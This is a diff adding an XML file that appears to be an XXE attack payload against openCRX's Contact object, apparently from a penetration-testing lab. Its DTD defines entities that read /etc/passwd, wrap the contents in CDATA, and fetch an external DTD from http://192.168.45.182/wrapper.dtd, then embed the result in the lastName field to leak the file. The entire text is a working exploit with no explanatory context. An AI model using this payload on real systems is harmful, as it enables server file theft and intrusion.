@@ -1,0 +1,12 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % file SYSTEM "file:///etc/passwd" >
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "http://192.168.45.182/wrapper.dtd" >
+%dtd;
+]>
+<org.opencrx.kernel.account1.Contact>
+  <lastName>star_abc&wrapper;end_abc</lastName>
+  <firstName>Tom</firstName>
+</org.opencrx.kernel.account1.Contact>
